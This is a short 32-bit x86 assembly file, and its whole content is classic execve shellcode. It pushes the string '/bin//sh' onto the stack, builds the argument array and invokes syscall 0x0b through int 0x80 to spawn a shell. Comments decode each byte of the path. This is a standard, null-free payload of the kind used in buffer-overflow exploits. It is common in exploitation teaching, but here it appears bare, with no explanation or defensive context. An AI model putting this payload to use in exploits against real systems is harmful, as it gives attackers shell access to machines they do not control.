.globl main
main:
# 0x2f = /
# 0x62 = b
# 0x69 = i
# 0x6e = n

# 0x2f = /
# 0x2f = /
# 0x73 = s
# 0x68 = h

xor    %eax, %eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp, %ebx
push   %eax
push   %ebx
mov    %esp, %ecx
mov    $0x0b, %al
int    $0x80

